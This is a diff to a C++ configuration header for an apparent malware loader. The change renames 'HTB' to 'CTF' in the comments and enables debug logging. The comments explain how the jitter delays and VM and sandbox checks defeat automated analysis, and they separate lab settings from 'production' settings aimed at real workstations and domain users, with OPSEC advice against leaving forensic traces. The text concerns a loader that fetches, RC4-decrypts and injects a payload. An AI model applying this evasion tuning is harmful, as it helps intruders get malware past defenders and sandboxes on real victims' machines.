@@ -10,19 +10,19 @@ namespace app::config {
 //  LOADER BEHAVIOUR SWITCHES
 // ===========================================================================
 //
-//  IMPORTANT: HTB boxes are VMs with low specs (1-2 CPUs, ~4 GB RAM,
+//  IMPORTANT: CTF boxes are VMs with low specs (1-2 CPUs, ~4 GB RAM,
 //  generic username, hypervisor CPUID string). The sandbox gate WILL fire
 //  with a score of 2-4 and the loader will instantly ExitProcess(0) before
 //  it ever touches the network. This is why you see ZERO HTTP hits on your
 //  listener when these checks are enabled.
 //
-//  HTB / LAB / CTF  →  set all three to the values shown below
+//  CTF / LAB        →  set all three to the values shown below
 //  PRODUCTION       →  see README.md for recommended production settings
 // ===========================================================================
 
 //  Jitter delay (30-120 s sleep + 3x 1-5 s micro-delays).
 //
-//  HTB/lab:    false  — instant execution, no waiting.
+//  CTF/lab:    false  — instant execution, no waiting.
 //  Production: true   — defeats automated sandbox detonation (most sandboxes
 //                       time out after ~30 s).
 inline constexpr bool kEnableJitter = false;
@@ -34,7 +34,7 @@ inline constexpr bool kEnableJitter = false;
 //              resolution<1024x768.
 //  Abort rule: score >= 2 (at least TWO checks must fire).
 //
-//  HTB/lab:    false  — the target IS a VM with low specs; the gate kills
+//  CTF/lab:    false  — the target IS a VM with low specs; the gate kills
 //                       the loader immediately. This is the #1 reason for
 //                       "silent failure / zero HTTP hits".
 //  Production: true   — real workstations (4+ CPUs, 8+ GB RAM, domain user,
@@ -46,9 +46,9 @@ inline constexpr bool kEnableEvasionChecks = false;
 //  When enabled, every phase writes a line to the log so you can diagnose
 //  exactly where the loader died (jitter? evasion? URL? HTTP? RC4? inject?).
 //
-//  HTB/lab:    true   — invaluable for troubleshooting.
+//  CTF/lab:    true   — invaluable for troubleshooting.
 //  Production: false  — leaves forensic traces. Disable for OPSEC.
-inline constexpr bool kEnableDebugLog = false;
+inline constexpr bool kEnableDebugLog = true;
 
 // ===========================================================================
 //  OPERATIONAL LOADER CONFIGURATION
